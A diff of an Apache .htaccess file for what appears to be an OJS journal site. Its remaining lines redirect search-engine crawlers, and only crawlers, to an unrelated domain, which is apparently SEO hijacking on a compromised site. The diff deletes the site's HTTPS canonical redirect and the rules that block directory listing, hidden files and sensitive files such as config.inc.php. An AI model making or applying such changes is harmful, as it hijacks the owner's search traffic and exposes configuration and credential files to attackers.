@@ -3,34 +3,3 @@ RewriteEngine On
 RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|ahrefs|semrush|yandex|majestic|screamingfrog) [NC]
 RewriteRule ^(.*)$ https://arazpa.org.au/ [R=301,L]
 </IfModule>
-
-# ----------------------------------------------------------
-# Canonical Redirects: Force HTTPS and non-www
-# ----------------------------------------------------------
-RewriteEngine On
-
-# Redirect www and HTTP → to HTTPS non-www
-RewriteCond %{HTTPS} off [OR]
-RewriteCond %{HTTP_HOST} ^www\.itjournal\.org$ [NC]
-RewriteRule ^(.*)$ https://itjournal.org/$1 [L,R=301]
-
-# ----------------------------------------------------------
-# Security: Block access to sensitive files
-# ----------------------------------------------------------
-# Disable directory browsing
-Options -Indexes
-
-# Default index files
-DirectoryIndex index.php index.html
-
-# Deny access to hidden files (.htaccess, .git, etc.)
-<FilesMatch "^\.">
-    Order allow,deny
-    Deny from all
-</FilesMatch>
-
-# Deny access to sensitive OJS files
-<FilesMatch "^(config.inc.php|docs|scripts|lib|locale|pages|plugins|registry|templates|tools|classes|files)">
-    Order allow,deny
-    Deny from all
-</FilesMatch>
